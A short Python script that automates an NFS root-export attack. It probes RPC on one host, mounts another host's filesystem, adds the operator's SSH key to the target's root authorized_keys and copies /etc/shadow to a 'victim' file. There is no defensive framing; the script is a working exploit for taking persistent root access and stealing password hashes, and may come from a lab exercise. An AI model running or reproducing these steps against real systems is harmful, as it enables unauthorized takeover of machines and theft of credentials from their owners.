import subprocess

def execute_command(command):
    """Execute a command and return True if it succeeds, False otherwise."""
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        print(f"Command '{command}' failed with error: {e.stderr.decode().strip()}")
        return False

def main():
    commands = [
        "rpcinfo -p 10.10.200.2",
        "mkdir /tmp/r00t",
        "mount -t nfs 10.0.0.27:/ /tmp/r00t",
        "cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys",
        "cp /tmp/r00t/etc/shadow ~/victim_shadow_file",
        "umount /tmp/r00t"
    ]

    for command in commands:
        if not execute_command(command):
            print("One or more commands failed. Exiting.")
            return

    print("OK")

if __name__ == "__main__":
    main()
